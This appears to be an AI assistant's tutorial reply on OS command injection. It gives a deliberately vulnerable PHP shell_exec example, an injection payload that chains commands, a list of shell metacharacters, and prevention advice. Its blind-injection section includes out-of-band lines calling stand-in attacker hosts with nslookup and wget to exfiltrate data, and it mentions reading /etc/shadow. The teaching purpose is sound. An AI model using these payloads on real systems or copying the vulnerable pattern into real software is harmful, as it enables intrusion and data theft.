That's a perfect summary. You've correctly identified the core concepts: the alternative name (shell injection), the impact (full compromise), and the potential for lateral movement within an infrastructure.

To build on your excellent definition, let's break down **how** it works, look at a concrete example, and outline the most effective ways to prevent it.

### How It Works: A Simple Analogy

Imagine an application needs to ask the server a question, like "What are the files in the user's directory?".

Instead of using a safe, built-in function to list files, the application is lazily designed to literally type your request into the server's command line and hit "Enter".

The application takes the username you provide and plugs it into a command template.

**The Vulnerable Code (Example in PHP):**
```php
<?php
// Get the username from a web form input
$username = $_GET['username'];

// DANGER: The application blindly passes the input to the shell
// The command might look like: grep -i "USER_INPUT" /etc/passwd
$command = "grep -i \"" . $username . "\" /etc/passwd";
$output = shell_exec($command);

echo "<pre>$output</pre>";
?>
```

### The Attack: From Input to Exploit

A normal user might enter `admin`, and the server executes:
`grep -i "admin" /etc/passwd`

An attacker, however, sees an opportunity. They know that in most shells, you can chain multiple commands together. They enter something like this:
`admin" ; ls -la / ; echo "test`

Now, the command being constructed becomes:
`grep -i "admin" ; ls -la / ; echo "test" /etc/passwd`

Let's look at what the shell sees:
1.  **`grep -i "admin"`** : The first command. It will look for "admin" in... wait, what's the file?
2.  **`;`** : A command separator. It tells the shell "the first command is done, run the next one."
3.  **`ls -la /`** : The attacker's injected command. It will list the entire contents of the root directory (`/`).
4.  **`;`** : Another separator.
5.  **`echo "test"`** : A harmless command chosen by the attacker.
6.  **`/etc/passwd`** : This is now just an extra argument left over from the original command. Since the `grep` command has already finished, this string is likely passed as an argument to the `echo "test"` command (or may cause a syntax error depending on the shell, but the damage from `ls` is already done).

The result: The attacker has successfully run the `ls -la /` command on the server, proving the vulnerability exists. From here, they could run much more damaging commands like `whoami`, `cat /etc/shadow`, or download and execute malware.

### Key Characters Used for Injection
Attackers use special shell metacharacters to break out of the intended command and run their own. The most common are:
- **`;`** (Semicolon): Command separator.
- **`&&`** and **`||`** : Conditional command execution.
- **`&`** : Run command in the background.
- **`|`** (Pipe): Pass the output of one command to another.
- **``` `command` ```** or **`$(command)`** : Command substitution (runs the command and replaces it with its output).
- **`>`** and **`>>`** : Output redirection.

### Blind OS Command Injection
Sometimes, the output of the command isn't returned in the HTTP response. This is called "blind" injection. In these cases, attackers use techniques like:
- **Time Delays:** Injecting `ping -c 10 127.0.0.1` or `sleep 5` to see if the response is delayed, confirming the command ran.
- **Out-of-Band (OAST):** Injecting a command like `nslookup attacker-controlled-server.com` or `wget http://attacker-server.com/$(whoami)` to force the server to make a network request to an attacker's server, exfiltrating data in the process.

### How to Prevent OS Command Injection

As you noted, the impact is critical. Prevention is straightforward in principle but requires strict discipline:

1.  **Avoid System Calls:** The best defense is to **not call OS commands directly from the application code.** Use built-in API functions provided by the programming language to perform tasks like file manipulation, network calls, or system information gathering.

2.  **Input Validation (Allowlisting):** If you absolutely must call a system command, never pass user input directly to it.
    - **Validate against a strict allowlist.** For example, if the user needs to choose a country, check their input against a list of expected values (e.g., `["USA", "Canada", "UK"]`). If it's not on the list, reject it.

3.  **Input Sanitization (Escaping):** If you must incorporate user input into a command, use a dedicated escaping function for the shell. For instance, PHP's `escapeshellarg()` or `escapeshellcmd()` functions. However, this is a **second-best** defense, as escaping functions can sometimes be bypassed or have edge-case flaws.

4.  **Principle of Least Privilege:** Ensure the application's operating system user has the minimum permissions necessary. If the web server runs as a low-privileged user, an attacker who successfully injects a command will be trapped in that limited context, making it harder to compromise the entire system.